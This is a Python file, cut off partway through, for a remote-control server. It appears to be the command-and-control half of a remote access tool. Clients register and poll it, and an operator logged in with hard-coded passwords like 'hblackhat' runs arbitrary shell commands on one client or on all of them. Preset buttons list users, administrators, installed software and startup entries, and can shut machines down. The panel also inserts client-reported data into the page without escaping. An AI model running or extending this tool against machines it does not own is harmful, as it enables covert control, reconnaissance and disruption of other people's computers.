# server.py - Enhanced Version with Advanced Security
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import urllib.parse
import uuid
import hashlib
import threading
import sqlite3
import os
from datetime import datetime
import socketserver
import re

class ThreadedHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
    """Multi-threaded HTTP server for handling concurrent connections"""
    daemon_threads = True

class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
    sessions = {}
    commands_queue = {}
    failed_attempts = {}
    PASSWORD_HASH = hashlib.sha256(b"hblackhat").hexdigest()
    ADMIN_PASSWORD_HASH = hashlib.sha256(b"sudohacker").hexdigest()
    session_lock = threading.Lock()
    MAX_FAILED_ATTEMPTS = 10
    BLOCK_TIME = 30  # ⚡ غير من 600 إلى 30
    ACTIVE_THRESHOLD = 30
    COMMAND_TIMEOUT = 2
    blocked_ips = set()
    
    # إضافة: ملف كلمات المرور القابلة للتغيير
    PASSWORD_FILE = "passwords.json"
    DEFAULT_PASSWORDS = {
        "user_password": "hblackhat",
        "admin_password": "sudohacker"
    }
    
    def load_passwords(self):
        """تحميل كلمات المرور من الملف"""
        try:
            if os.path.exists(self.PASSWORD_FILE):
                with open(self.PASSWORD_FILE, 'r') as f:
                    return json.load(f)
        except:
            pass
        return self.DEFAULT_PASSWORDS.copy()
    
    def save_passwords(self, passwords):
        """حفظ كلمات المرور في الملف"""
        try:
            with open(self.PASSWORD_FILE, 'w') as f:
                json.dump(passwords, f)
            return True
        except:
            return False
    
    def get_password_hash(self, password_type):
        """الحصول على الهاش لنوع كلمة المرور"""
        passwords = self.load_passwords()
        password = passwords.get(password_type, "")
        return hashlib.sha256(password.encode()).hexdigest()
    
    def init_database(self):
        """Initialize database for activity logging"""
        self.conn = sqlite3.connect('remote_control.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                command TEXT,
                response TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS clients (
                id TEXT PRIMARY KEY,
                ip TEXT,
                computer_name TEXT,
                os TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT
            )
        ''')
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS security_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT,
                action TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        # إضافة: جدول لتسجيل تغييرات كلمات المرور
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS password_changes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                changed_by TEXT,
                password_type TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        self.conn.commit()
    
    def log_security_event(self, action):
        """تسجيل أحداث الأمان"""
        try:
            self.cursor.execute(
                'INSERT INTO security_logs (ip, action) VALUES (?, ?)',
                (self.client_address[0], action)
            )
            self.conn.commit()
        except:
            pass
    
    def is_ip_blocked(self):
        """التحقق إذا كان IP محظور"""
        return self.client_address[0] in self.blocked_ips
    
    def block_ip(self, ip):
        """حظر IP"""
        self.blocked_ips.add(ip)
        self.log_security_event(f"IP Blocked: {ip}")
        print(f"🚫 IP Blocked: {ip}")
    
    def check_security(self):
        """فحص الأمان قبل معالجة أي طلب"""
        client_ip = self.client_address[0]
        
        if self.is_ip_blocked():
            self.send_error(403, "Access Denied - IP Blocked")
            return False
        
        user_agent = self.headers.get('User-Agent', '')
        if not user_agent or len(user_agent) < 10:
            self.log_security_event("Suspicious User-Agent")
        
        if hasattr(self, 'last_request_time'):
            current_time = time.time()
            if current_time - self.last_request_time < 0.05:  # ⚡ غير من 0.1 إلى 0.05
                self.block_ip(client_ip)
                return False
        
        self.last_request_time = time.time()
        return True
    
    def log_message(self, format, *args):
        """Disable verbose logs"""
        pass
    
    def do_GET(self):
        if not self.check_security():
            return
            
        try:
            parsed_path = urllib.parse.urlparse(self.path)
            path = parsed_path.path
            
            if path == '/':
                self.send_login_page()
            elif path == '/remote':
                self.send_remote_client()
            elif path == '/admin-auth':
                self.send_admin_auth_page()
            elif path == '/control':
                self.send_control_panel()
            elif path == '/sessions':
                self.send_sessions_list()
            elif path == '/commands':
                self.handle_get_commands()
            elif path == '/result':
                self.handle_get_result()
            elif path == '/download-client':
                self.download_python_client()
            elif path == '/download-python-client':
                self.download_python_client()
            elif path == '/history':
                self.send_command_history()
            elif path == '/status':
                self.send_system_status()
            # إضافة: صفحة إعدادات الأمان
            elif path == '/settings':
                self.send_settings_page()
            else:
                self.send_404_page()
                
        except Exception as e:
            self.send_error(500, str(e))
    
    def do_POST(self):
        if not self.check_security():
            return
            
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length > 10000:
                self.send_error(413, "Payload too large")
                return
                
            post_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(post_data) if post_data else {}
            
            if self.path == '/login':
                self.handle_login(data)
            elif self.path == '/admin-login':
                self.handle_admin_login(data)
            elif self.path == '/execute':
                self.handle_execute_command(data)
            elif self.path == '/response':
                self.handle_client_response(data)
            elif self.path == '/register':
                self.handle_client_register(data)
            # إضافة: معالجة تغيير كلمة المرور
            elif self.path == '/change-password':
                self.handle_change_password(data)
            else:
                self.send_error(404, "Not found")
                
        except Exception as e:
            self.send_json({'error': str(e)})
    
    # إضافة: صفحة إعدادات تغيير كلمة المرور
    def send_settings_page(self):
        """إرسال صفحة إعدادات تغيير كلمة المرور"""
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Security Settings</title>
            <style>
                body {
                    font-family: 'Segoe UI', Arial, sans-serif;
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    margin: 0;
                    padding: 20px;
                }
                .container {
                    max-width: 600px;
                    margin: 50px auto;
                    background: rgba(45, 45, 45, 0.95);
                    padding: 40px;
                    border-radius: 15px;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                }
                .header {
                    text-align: center;
                    margin-bottom: 30px;
                }
                .logo {
                    font-size: 48px;
                    margin-bottom: 10px;
                }
                .password-form {
                    background: rgba(255,255,255,0.05);
                    padding: 20px;
                    border-radius: 10px;
                    margin: 20px 0;
                }
                input, select, button {
                    width: 100%;
                    padding: 12px;
                    margin: 8px 0;
                    border-radius: 6px;
                    border: none;
                    font-size: 16px;
                }
                input, select {
                    background: rgba(255,255,255,0.1);
                    color: white;
                    border: 1px solid rgba(255,255,255,0.2);
                }
                button {
                    background: linear-gradient(135deg, #0078d4, #005a9e);
                    color: white;
                    cursor: pointer;
                    font-weight: bold;
                    transition: all 0.3s ease;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .back-btn {
                    background: linear-gradient(135deg, #6c757d, #495057);
                    margin-top: 20px;
                }
                .message {
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    text-align: center;
                    display: none;
                }
                .success {
                    background: rgba(40, 167, 69, 0.2);
                    border: 1px solid #28a745;
                }
                .error {
                    background: rgba(220, 53, 69, 0.2);
                    border: 1px solid #dc3545;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <div class="logo">🔐</div>
                    <h2>Security Settings</h2>
                    <p>Change Authentication Passwords</p>
                </div>

                <div id="message" class="message"></div>

                <div class="password-form">
                    <h3>🔑 Change Level 1 Password</h3>
                    <input type="password" id="currentPassword1" placeholder="Current Level 1 Password">
                    <input type="password" id="newPassword1" placeholder="New Level 1 Password">
                    <input type="password" id="confirmPassword1" placeholder="Confirm New Password">
                    <button onclick="changePassword('level1')">Update Level 1 Password</button>
                </div>

                <div class="password-form">
                    <h3>🛡️ Change Admin Password</h3>
                    <input type="password" id="currentPassword2" placeholder="Current Admin Password">
                    <input type="password" id="newPassword2" placeholder="New Admin Password">
                    <input type="password" id="confirmPassword2" placeholder="Confirm New Password">
                    <button onclick="changePassword('level2')">Update Admin Password</button>
                </div>

                <button class="back-btn" onclick="goBack()">← Back to Control Panel</button>
            </div>

            <script>
                function showMessage(text, type) {
                    const message = document.getElementById('message');
                    message.textContent = text;
                    message.className = 'message ' + type;
                    message.style.display = 'block';
                    setTimeout(() => {
                        message.style.display = 'none';
                    }, 5000);
                }

                function changePassword(level) {
                    let currentId, newId, confirmId;
                    
                    if (level === 'level1') {
                        currentId = 'currentPassword1';
                        newId = 'newPassword1';
                        confirmId = 'confirmPassword1';
                    } else {
                        currentId = 'currentPassword2';
                        newId = 'newPassword2';
                        confirmId = 'confirmPassword2';
                    }

                    const currentPassword = document.getElementById(currentId).value;
                    const newPassword = document.getElementById(newId).value;
                    const confirmPassword = document.getElementById(confirmId).value;

                    if (!currentPassword || !newPassword || !confirmPassword) {
                        showMessage('Please fill all fields', 'error');
                        return;
                    }

                    if (newPassword !== confirmPassword) {
                        showMessage('New passwords do not match', 'error');
                        return;
                    }

                    if (newPassword.length < 4) {
                        showMessage('Password must be at least 4 characters', 'error');
                        return;
                    }

                    fetch('/change-password', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            level: level,
                            current_password: currentPassword,
                            new_password: newPassword
                        })
                    })
                    .then(r => r.json())
                    .then(data => {
                        if (data.success) {
                            showMessage('Password updated successfully!', 'success');
                            // Clear fields
                            document.getElementById(currentId).value = '';
                            document.getElementById(newId).value = '';
                            document.getElementById(confirmId).value = '';
                        } else {
                            showMessage(data.error || 'Failed to update password', 'error');
                        }
                    })
                    .catch(err => {
                        showMessage('Network error: ' + err, 'error');
                    });
                }

                function goBack() {
                    window.location.href = '/control';
                }
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())

    # إضافة: معالجة تغيير كلمة المرور
    def handle_change_password(self, data):
        """معالجة طلب تغيير كلمة المرور"""
        level = data.get('level')
        current_password = data.get('current_password')
        new_password = data.get('new_password')
        
        if not level or not current_password or not new_password:
            self.send_json({'success': False, 'error': 'Missing required fields'})
            return
        
        # التحقق من كلمة المرور الحالية
        passwords = self.load_passwords()
        
        if level == 'level1':
            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
            expected_hash = hashlib.sha256(passwords['user_password'].encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current Level 1 password is incorrect'})
                return
            
            # تحديث كلمة المرور
            passwords['user_password'] = new_password
            
        elif level == 'level2':
            current_hash = hashlib.sha256(current_password.encode()).hexdigest()
            expected_hash = hashlib.sha256(passwords['admin_password'].encode()).hexdigest()
            
            if current_hash != expected_hash:
                self.send_json({'success': False, 'error': 'Current Admin password is incorrect'})
                return
            
            # تحديث كلمة المرور
            passwords['admin_password'] = new_password
        
        else:
            self.send_json({'success': False, 'error': 'Invalid password level'})
            return
        
        # حفظ كلمات المرور الجديدة
        if self.save_passwords(passwords):
            # تسجيل الحدث
            self.log_security_event(f"Password changed for {level}")
            
            # تسجيل في قاعدة البيانات
            if hasattr(self, 'cursor'):
                self.cursor.execute(
                    'INSERT INTO password_changes (changed_by, password_type) VALUES (?, ?)',
                    (self.client_address[0], level)
                )
                self.conn.commit()
            
            self.send_json({'success': True})
        else:
            self.send_json({'success': False, 'error': 'Failed to save new password'})

    def send_login_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Remote Control - Authentication</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                input::placeholder { color: #ccc; }
                button { 
                    background: linear-gradient(135deg, #0078d4, #005a9e); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                    transition: all 0.3s ease;
                }
                button:hover {
                    background: linear-gradient(135deg, #005a9e, #004578);
                    transform: translateY(-2px);
                }
                .security-notice {
                    background: rgba(255,0,0,0.1);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid rgba(255,0,0,0.3);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🔒</div>
                <h2>Enhanced Remote Control</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Secure System Management - Level 1 Authentication</p>
                
                <div class="security-notice" id="securityNotice" style="display:none;">
                    ⚠️ Multiple failed attempts detected
                </div>
                
                <input type="password" id="password" placeholder="Enter Level 1 Password">
                <button onclick="login()">Authenticate</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    🔐 Multi-layer security system active
                </div>
            </div>
            <script>
                let failedAttempts = 0;
                
                function showSecurityWarning() {
                    document.getElementById('securityNotice').style.display = 'block';
                }
                
                function login() {
                    const password = document.getElementById('password').value;
                    if (!password) {
                        alert('Please enter password');
                        return;
                    }
                    
                    fetch('/login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            window.location = '/admin-auth';
                        } else {
                            failedAttempts++;
                            if (failedAttempts >= 2) {
                                showSecurityWarning();
                            }
                            alert('Authentication failed! Wrong password.');
                        }
                    }).catch(err => {
                        alert('Connection error: ' + err);
                    });
                }
                
                document.getElementById('password').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') login();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def send_admin_auth_page(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin Authentication</title>
            <style>
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
                    color: white; 
                    display: flex; 
                    justify-content: center; 
                    align-items: center; 
                    height: 100vh;
                    margin: 0;
                }
                .container { 
                    background: rgba(45, 45, 45, 0.95); 
                    padding: 40px; 
                    border-radius: 15px; 
                    text-align: center;
                    backdrop-filter: blur(10px);
                    box-shadow: 0 8px 32px rgba(0,0,0,0.3);
                    width: 400px;
                }
                .logo { 
                    font-size: 48px; 
                    margin-bottom: 20px; 
                }
                input, button { 
                    padding: 15px; 
                    margin: 10px; 
                    width: 280px; 
                    border-radius: 8px; 
                    font-size: 16px;
                    border: none;
                }
                input { 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                }
                button { 
                    background: linear-gradient(135deg, #e74c3c, #c0392b); 
                    color: white; 
                    border: none; 
                    cursor: pointer;
                    font-weight: bold;
                }
                .security-level {
                    background: rgba(231, 76, 60, 0.2);
                    padding: 10px;
                    border-radius: 5px;
                    margin: 10px 0;
                    border: 1px solid #e74c3c;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">🛡️</div>
                <h2>Admin Authentication</h2>
                <p style="color: #ccc; margin-bottom: 30px;">Level 2 Security - Administrative Access</p>
                
                <div class="security-level">
                    ⚠️ HIGH SECURITY LEVEL - ADMIN ACCESS REQUIRED
                </div>
                
                <input type="password" id="adminPassword" placeholder="Enter Admin Password">
                <button onclick="adminLogin()">Admin Authentication</button>
                
                <div style="margin-top: 20px; font-size: 12px; color: #888;">
                    🚨 Unauthorized access will be logged and blocked
                </div>
            </div>
            <script>
                function adminLogin() {
                    const password = document.getElementById('adminPassword').value;
                    if (!password) {
                        alert('Please enter admin password');
                        return;
                    }
                    
                    fetch('/admin-login', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({password: password})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            window.location = '/control';
                        } else {
                            alert('Admin authentication failed! Access denied.');
                        }
                    }).catch(err => {
                        alert('Connection error: ' + err);
                    });
                }
                
                document.getElementById('adminPassword').addEventListener('keypress', function(e) {
                    if (e.key === 'Enter') adminLogin();
                });
            </script>
        </body>
        </html>
        '''
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(html.encode())
    
    def handle_login(self, data):
        client_ip = self.client_address[0]
        
        if client_ip in self.failed_attempts:
            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
                time_diff = time.time() - self.failed_attempts[client_ip]['last_attempt']
                if time_diff < self.BLOCK_TIME:
                    self.send_json({'success': False, 'error': 'Too many failed attempts. Try again later.'})
                    return
                else:
                    del self.failed_attempts[client_ip]
        
        password = data.get('password', '')
        # التعديل: استخدام كلمات المرور القابلة للتغيير
        expected_hash = self.get_password_hash("user_password")
        
        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
            self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
            self.log_security_event("Level 1 authentication successful")
            self.send_json({'success': True})
        else:
            if client_ip not in self.failed_attempts:
                self.failed_attempts[client_ip] = {'count': 0, 'last_attempt': time.time()}
            
            self.failed_attempts[client_ip]['count'] += 1
            self.failed_attempts[client_ip]['last_attempt'] = time.time()
            
            self.log_security_event(f"Failed level 1 authentication - Attempt {self.failed_attempts[client_ip]['count']}")
            
            if self.failed_attempts[client_ip]['count'] >= self.MAX_FAILED_ATTEMPTS:
                self.block_ip(client_ip)
            
            self.send_json({'success': False})
    
    def handle_admin_login(self, data):
        client_ip = self.client_address[0]
        password = data.get('password', '')
        # التعديل: استخدام كلمات المرور القابلة للتغيير
        expected_hash = self.get_password_hash("admin_password")
        
        if hashlib.sha256(password.encode()).hexdigest() == expected_hash:
            self.log_security_event("Admin authentication successful")
            self.send_json({'success': True})
        else:
            self.log_security_event("Failed admin authentication")
            self.block_ip(client_ip)
            self.send_json({'success': False})

    def send_control_panel(self):
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Enhanced Control Panel - ULTRA FAST</title>
            <style>
                :root {
                    --primary: #0078d4;
                    --success: #28a745;
                    --danger: #dc3545;
                    --warning: #ffc107;
                    --dark: #1e1e1e;
                    --darker: #2d2d2d;
                    --light: #f8f9fa;
                }
                
                body { 
                    font-family: 'Segoe UI', Arial, sans-serif; 
                    background: var(--dark); 
                    color: var(--light); 
                    margin: 0; 
                    padding: 20px;
                    overflow-x: hidden;
                }
                
                .header {
                    background: var(--darker);
                    padding: 20px;
                    border-radius: 10px;
                    margin-bottom: 20px;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                }
                
                .container { 
                    display: grid; 
                    grid-template-columns: 350px 1fr; 
                    gap: 20px; 
                    height: 90vh; 
                }
                
                .sidebar { 
                    background: var(--darker); 
                    padding: 20px; 
                    border-radius: 10px;
                    display: flex;
                    flex-direction: column;
                }
                
                .main { 
                    display: flex; 
                    flex-direction: column;
                    gap: 20px;
                }
                
                .session-item { 
                    background: rgba(255,255,255,0.05); 
                    padding: 15px; 
                    margin: 8px 0; 
                    border-radius: 8px; 
                    cursor: pointer;
                    border: 2px solid transparent;
                    transition: all 0.3s ease;
                    position: relative;
                }
                
                .session-item:hover {
                    background: rgba(255,255,255,0.1);
                    border-color: var(--primary);
                }
                
                .session-item.active { 
                    border: 2px solid var(--success);
                    background: rgba(40, 167, 69, 0.1);
                }
                
                .session-item.offline {
                    opacity: 0.6;
                    border-color: var(--danger);
                }
                
                .online-status {
                    position: absolute;
                    top: 10px;
                    right: 10px;
                    width: 10px;
                    height: 10px;
                    border-radius: 50%;
                    background: var(--success);
                }
                
                .online-status.offline {
                    background: var(--danger);
                }
                
                .terminal { 
                    background: #000; 
                    color: #00ff00; 
                    padding: 20px; 
                    border-radius: 8px; 
                    font-family: 'Consolas', monospace; 
                    flex: 1; 
                    overflow-y: auto; 
                    white-space: pre-wrap;
                    font-size: 14px;
                    min-height: 400px;
                }
                
                button { 
                    background: var(--primary); 
                    color: white; 
                    border: none; 
                    padding: 12px 16px; 
                    margin: 4px; 
                    border-radius: 6px; 
                    cursor: pointer;
                    transition: all 0.3s ease;
                    font-weight: 500;
                }
                
                button:hover {
                    transform: translateY(-2px);
                    box-shadow: 0 4px 12px rgba(0,0,0,0.3);
                }
                
                button.danger { background: var(--danger); }
                button.success { background: var(--success); }
                button.warning { background: var(--warning); color: #000; }
                
                .controls-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
                    gap: 8px;
                    margin: 15px 0;
                }
                
                .command-input { 
                    display: flex; 
                    margin: 15px 0; 
                    gap: 10px;
                }
                
                .command-input input { 
                    flex: 1; 
                    padding: 12px; 
                    background: rgba(255,255,255,0.1); 
                    color: white; 
                    border: 1px solid rgba(255,255,255,0.2); 
                    border-radius: 6px;
                    font-family: 'Consolas', monospace;
                }
                
                .stats {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 10px;
                    margin: 15px 0;
                }
                
                .stat-card {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    text-align: center;
                }
                
                .multi-control {
                    background: var(--darker);
                    padding: 15px;
                    border-radius: 8px;
                    margin: 10px 0;
                }
                .security-badge {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 5px 10px;
                    border-radius: 15px;
                    font-size: 12px;
                    margin-left: 10px;
                }
                .settings-btn {
                    background: linear-gradient(135deg, #17a2b8, #138496) !important;
                    margin-left: 10px;
                }
                .speed-indicator {
                    background: linear-gradient(135deg, #28a745, #20c997);
                    padding: 3px 8px;
                    border-radius: 10px;
                    font-size: 10px;
                    margin-left: 5px;
                }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>⚡ ULTRA FAST Remote Control <span class="security-badge">HIGH SPEED</span></h2>
                <div>
                    <button onclick="loadSessions()">Refresh List</button>
                    <button onclick="executeAll('sysinfo')">System Info All</button>
                    <button class="settings-btn" onclick="openSettings()">Security Settings</button>
                    <button class="warning" onclick="logout()">Logout</button>
                </div>
            </div>
            
            <div class="container">
                <div class="sidebar">
                    <h3>Connected Clients <span class="speed-indicator">LIVE</span> (<span id="clientsCount">0</span>)</h3>
                    <div id="sessionsList" style="flex: 1; overflow-y: auto; max-height: 500px;">
                        <div style="text-align: center; color: #666; padding: 20px;">
                            Loading clients...
                        </div>
                    </div>
                    
                    <div class="stats">
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold;" id="totalClients">0</div>
                            <small>Total Clients</small>
                        </div>
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold;" id="activeClients">0</div>
                            <small>Active</small>
                        </div>
                        <div class="stat-card">
                            <div style="font-size: 24px; font-weight: bold;" id="commandsSent">0</div>
                            <small>Commands</small>
                        </div>
                    </div>
                </div>
                
                <div class="main">
                    <div style="background: var(--darker); padding: 20px; border-radius: 10px;">
                        <h3>Selected Client: <span id="currentClient" style="color: var(--success);">Not Selected</span></h3>
                        
                        <div class="multi-control">
                            <strong>Quick Commands <span class="speed-indicator">INSTANT</span>:</strong>
                            <div class="controls-grid">
                                <button onclick="executeCommand('sysinfo')">System Info</button>
                                <button onclick="executeCommand('whoami')">Current User</button>
                                <button onclick="executeCommand('ipconfig /all')">Network Info</button>
                                <button onclick="executeCommand('dir')">Files List</button>
                                <button onclick="executeCommand('tasklist')">Active Processes</button>
                                <button onclick="executeCommand('netstat -an')">Network Connections</button>
                                <button onclick="executeCommand('systeminfo')">System Details</button>
                                <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
                                <button onclick="executeCommand('net user')">Users</button>
                                <button onclick="executeCommand('net localgroup administrators')">Administrators</button>
                                <button onclick="executeCommand('ping google.com')">Connection Test</button>
                                <button onclick="executeCommand('calc')">Calculator</button>
                                <button onclick="executeCommand('notepad')">Notepad</button>
                                <button onclick="executeCommand('cmd /c start')">New CMD</button>
                                <button onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
                                <button class="danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
                                <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
                                <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">Top Processes</button>
                                <button onclick="executeCommand('wmic product get name,version')">Installed Software</button>
                                <button onclick="executeCommand('net start')">Active Services</button>
                                <button onclick="executeCommand('schtasks /query /fo LIST')">Scheduled Tasks</button>
                                <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">Startup Programs</button>
                            </div>
                        </div>
                        
                        <div class="command-input">
                            <input type="text" id="commandInput" placeholder="Enter custom command (INSTANT execution)" 
                                   onkeypress="if(event.key=='Enter') executeCustomCommand()">
                            <button onclick="executeCustomCommand()">Execute Command</button>
                            <button class="success" onclick="executeSelected('commandInput')">Execute on Selected</button>
                        </div>
                    </div>
                    
                    <div class="terminal" id="terminal">
⚡ ULTRA FAST REMOTE CONTROL SYSTEM READY

• Select a client from the left panel
• Use quick commands or enter custom commands
• INSTANT execution - responses in under 1 second
• All activities are logged for security
• 🚀 HIGH SPEED mode activated

                    </div>
                </div>
            </div>
            
            <script>
                let currentClientId = null;
                let commandCounter = 0;
                let allClients = [];
                
                function loadSessions() {
                    fetch('/sessions?_t=' + Date.now())
                        .then(r => r.json())
                        .then(sessions => {
                            allClients = sessions;
                            updateSessionStats(sessions);
                            const list = document.getElementById('sessionsList');
                            
                            if (sessions.length === 0) {
                                list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients connected</div>';
                                return;
                            }
                            
                            list.innerHTML = sessions.map(client => {
                                const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 30000; // ⚡ غير من 60000 إلى 30000
                                const isSelected = client.id === currentClientId;
                                const statusClass = isActive ? 'online-status' : 'online-status offline';
                                
                                return `
                                    <div class="session-item ${isSelected ? 'active' : ''} ${!isActive ? 'offline' : ''}" 
                                         onclick="selectClient('${client.id}')">
                                        <div class="${statusClass}"></div>
                                        <strong>${client.computer || client.id}</strong><br>
                                        <small>User: ${client.user || 'Unknown'}</small><br>
                                        <small>OS: ${client.os || 'Unknown'}</small><br>
                                        <small>IP: ${client.ip}</small><br>
                                        <small>Last Active: ${new Date(client.last_seen).toLocaleTimeString()}</small>
                                    </div>
                                `;
                            }).join('');
                        });
                }
                
                function updateSessionStats(sessions) {
                    const total = sessions.length;
                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 30000).length; // ⚡ غير من 60000 إلى 30000
                    
                    document.getElementById('totalClients').textContent = total;
                    document.getElementById('activeClients').textContent = active;
                    document.getElementById('commandsSent').textContent = commandCounter;
                    document.getElementById('clientsCount').textContent = total;
                }
                
                function selectClient(clientId) {
                    currentClientId = clientId;
                    loadSessions();
                    document.getElementById('currentClient').textContent = clientId;
                    addToTerminal(`Selected client: ${clientId}\\n`);
                }
                
                function executeCommand(command) {
                    if (!currentClientId) return alert('Please select a client first!');
                    executeSingleCommand(currentClientId, command);
                }
                
                function executeSingleCommand(clientId, command) {
                    commandCounter++;
                    const startTime = Date.now();
                    addToTerminal(`⚡ [${clientId}] ${command}\\n`);
                    
                    fetch('/execute', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({client_id: clientId, command: command})
                    }).then(r => r.json()).then(data => {
                        if (data.success) {
                            addToTerminal(`✅ Command sent instantly\\n`);
                            waitForResult(clientId, command, startTime);
                        } else {
                            addToTerminal(`❌ Error: ${data.error}\\n`);
                        }
                    }).catch(err => {
                        addToTerminal(`❌ Network error: ${err}\\n`);
                    });
                }
                
                function executeAll(command) {
                    if (allClients.length === 0) return alert('No clients connected!');
                    
                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 30000); // ⚡ غير من 60000 إلى 30000
                    if (activeClients.length === 0) return alert('No active clients!');
                    
                    addToTerminal(`⚡ Executing command on ${activeClients.length} clients: ${command}\\n`);
                    
                    activeClients.forEach(client => {
                        executeSingleCommand(client.id, command);
                    });
                }
                
                function executeSelected(inputId) {
                    const command = document.getElementById(inputId).value.trim();
                    if (!command) return alert('Please enter a command');
                    
                    if (currentClientId) {
                        executeCommand(command);
                    } else {
                        alert('Please select a client first');
                    }
                }
                
                function executeCustomCommand() {
                    const cmd = document.getElementById('commandInput').value.trim();
                    if (cmd) {
                        executeCommand(cmd);
                        document.getElementById('commandInput').value = '';
                    } else {
                        alert('Please enter a command');
                    }
                }
                
                function waitForResult(clientId, command, startTime) {
                    let attempts = 0;
                    const maxAttempts = 20; // ⚡ غير من 60 إلى 20
                    
                    const check = () => {
                        attempts++;
                        if (attempts > maxAttempts) {
                            const elapsed = (Date.now() - startTime) / 1000;
                            addToTerminal(`⏰ Timeout after ${elapsed.toFixed(1)}s: No response from ${clientId}\\n`);
                            return;
                        }
                        
                        fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now())
                            .then(r => r.json())
                            .then(data => {
                                if (data.result) {
                                    const responseTime = (Date.now() - startTime) / 1000;
